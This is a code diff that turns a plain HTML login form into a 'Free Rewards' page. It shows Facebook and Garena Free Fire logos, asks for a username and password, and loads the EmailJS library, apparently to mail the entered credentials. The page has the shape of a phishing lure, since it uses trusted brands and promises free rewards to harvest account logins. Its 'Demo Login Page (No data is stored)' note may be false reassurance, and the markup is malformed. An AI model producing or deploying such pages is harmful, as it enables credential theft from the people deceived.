@@ -1,40 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Login</title>
+<title>Free Rewards Login</title>
+
 <style>
+
 body{
+margin:0;
 font-family:Arial;
-background:#f4f4f4;
+background:linear-gradient(135deg,#ff6a00,#ee0979);
+height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-height:100vh;
 }
 
-.login-box{
+.box{
 background:white;
 padding:30px;
-border-radius:10px;
-box-shadow:0 0 10px rgba(0,0,0,0.2);
-width:300px;
+border-radius:12px;
+width:320px;
+text-align:center;
+box-shadow:0 0 15px rgba(0,0,0,0.3);
+}
+
+.logo{
+font-size:26px;
+font-weight:bold;
+margin-bottom:10px;
+}
+
+.game-logo img{
+width:80px;
+margin:10px;
 }
 
 input{
-width:100%;
+width:90%;
 padding:10px;
-margin:10px 0;
+margin:8px;
+border-radius:6px;
+border:1px solid #ccc;
 }
 
 button{
-width:100%;
+width:95%;
 padding:12px;
-background:#28a745;
-color:white;
+background:#ff6a00;
 border:none;
+color:white;
+font-size:16px;
+border-radius:6px;
 cursor:pointer;
 }
+
+button:hover{
+background:#ff3d00;
+}
+
+.note{
+font-size:12px;
+color:#666;
+margin-top:10px;
+}
+
 </style>
+
 </head>
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
@@ -67,13 +98,25 @@ alert("Login Successful");
 </html>
 <body>
 
-<div class="login-box">
+<div class="box">
 
-<h2>Login</h2>
+<div class="logo">🎁 Free Rewards</div>
 
-<input type="text" id="username" placeholder="Username">
-<input type="password" id="password" placeholder="Password">
+<div class="game-logo">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
+<img src="https://upload.wikimedia.org/wikipedia/en/1/1f/Garena_Free_Fire_logo.webp">
+</div>
 
-<button onclick="sendLogin()">Login</button>
+<input type="text" placeholder="Username">
+<input type="password" placeholder="Password">
+
+<button>Login</button>
+
+<div class="note">
+Demo Login Page (No data is stored)
+</div>
 
 </div>
+
+</body>
+</html>
